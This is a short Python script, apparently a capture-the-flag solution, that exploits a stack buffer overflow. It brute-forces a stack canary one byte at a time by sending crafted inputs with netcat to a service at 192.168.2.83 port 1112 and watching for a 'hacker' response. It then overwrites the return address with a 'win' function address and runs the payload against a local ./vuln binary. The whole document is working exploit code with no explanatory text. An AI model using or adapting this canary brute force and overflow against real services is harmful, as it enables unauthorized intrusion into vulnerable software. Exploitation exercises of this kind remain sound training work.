import subprocess

junk = "ABCD" * 32
input_len = 129
correct = ''
input_term = str(input_len) + '\n' + junk 
for j in range(4):
    
    for i in range (256):
        input_terms = input_term + chr(i) 
        #print(input_terms)
        process = subprocess.Popen(["nc 192.168.2.83 1112"], stdin=subprocess.PIPE, stdout=subprocess.PIPE,stderr = subprocess.PIPE)
        
        output = process.communicate(input=str(input_terms))[0]

        # process = subprocess.Popen(["./vuln"],  stdout=subprocess.PIPE,stderr = subprocess.PIPE)
        # output = process.communicate()[0]
        #print(output)
        
        if ("hacker" in output):
            
            continue
        else:
            print("Find correct one {}".format(i))
            # correct = 
            # print(input_term)
            input_len += 1
            input_term = str(input_len) + input_terms[3:]
            break
input_term = "148" + input_terms[3:]
win = chr(0xc6) + chr(0x86)+ chr(0x04) + chr(0x08)
input_term += ("AAAA" *3 + win) 
print(input_term)
process = subprocess.Popen(["./vuln"], stdin=subprocess.PIPE, stdout=subprocess.PIPE,stderr = subprocess.PIPE)
        
output = process.communicate(input=str(input_term))[0]    
print(output)
    
